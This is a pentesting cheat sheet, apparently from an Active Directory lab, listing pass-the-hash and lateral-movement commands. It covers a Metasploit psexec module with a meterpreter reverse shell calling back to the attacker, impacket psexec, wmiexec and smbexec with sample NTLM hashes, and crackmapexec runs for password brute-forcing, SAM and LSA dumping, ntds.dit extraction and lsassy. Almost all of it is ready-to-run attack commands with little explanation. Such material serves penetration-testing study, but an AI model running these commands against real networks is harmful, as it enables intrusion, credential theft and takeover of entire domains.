
#### Pass-the-hash using metasploit to get the shell:
```bash
#using domain user.
msfconsole -x "use exploit/windows/smb/psexec; \
set RHOSTS <IP-Address>; \
set SMBDomain <Domain-name>; \
set SMBUser <user>; \
set SMBPass <password or hash>; \
set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
set LHOST <local-ip>; \
set LPORT <local-port>; \
exploit"

#using local user.
msfconsole -x "use exploit/windows/smb/psexec; \
set RHOSTS <IP-Address>; \
set SMBUser <user>; \
set SMBPass <password or hash>; \
set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
set LHOST <local-ip>; \
set LPORT <local-port>; \
exploit"

```


PtH using psexec to get the shell:
```bash
#using domain account password,hash
impacket-psexec marvel.local/fcastle:'Password123'@192.168.154.131

impacket-psexec marvel.local/fcastle:@192.168.154.131
Password:

#using local account hash.
impacket-psexec administrator@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
```

Pth using  wmiexec.py & smbexec.py to get the shell
```bash
wmiexec.py <domain>/<username>@<target> -hashes <LMhash>:<NThash>
wmiexec.py DOMAIN/Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:6b3a55e0261b0304143f805a249b850a

smbexec.py <domain>/<username>@<target> -hashes <LMhash>:<NThash>
smbexec.py DOMAIN/Administrator@192.168.1.20 -hashes aad3b435b51404eeaad3b435b51404ee:6b3a55e0261b0304143f805a249b850a

```

using hash to gain RDP sessions :
```bash
xfreerdp /v:192.168.44.163 /u:Administrator /pth:<NTLM>
```


using smbclient to login using hash :
```bash
impacket-smbclient -hashes:<NTLM hash> Administrator@<ip address>
```

using crackmapexec :
```bash

crackmapexec <protocol> <Target_IP> -u ‘<username>‘ -p ‘<passwprd>‘
available protocols
  {ftp,smb,winrm,ssh,rdp,ldap,mssql}
    ftp                 own stuff using FTP
    smb                 own stuff using SMB
    winrm               own stuff using WINRM
    ssh                 own stuff using SSH
    rdp                 own stuff using RDP
    ldap                own stuff using LDAP
    mssql               own stuff using MSSQL
crackmapexec smb --help
crackmapexec ssh --help



crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1
crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH>
crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth
crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --sam

#enumerate shares
crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --shares

#enumerate local security authority
crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --lsa

#enumerate users
crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --users

#enumerate groups
crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --groups

#enumerate file based on patterns
crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --spider C\$ --pattern txt,log

#enumerate password policy.
crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --pass-pol
 
#enumerate disks
crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --disks

#Bruteforce username. 
crackmapexec smb 192.168.154.0/24 -u Administrator fcastle -d MARVEL.local -p P@\$\$w0rd

#Bruteforce password.
crackmapexec smb 192.168.154.0/24 -u Administrator fcastle -d MARVEL.local -p P@\$\$w0rd Password@123

#Bruteforce username and password
crackmapexec smb 192.168.154.0/24 -u ./users.txt  -d MARVEL.local -p ./pass.txt

#Dump ntds.dit database from domain controller using drsuapi protocol
crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --ntds drsuapi

#Dump ntds.dit database from domain controller using vss(Volumn shadow copy)
crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --ntds vss

#Checkout module of particular protocol.
crackmapexec smb -L

#using the modules
crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth -M lsassy



#interect with database
cmedb
creds



```

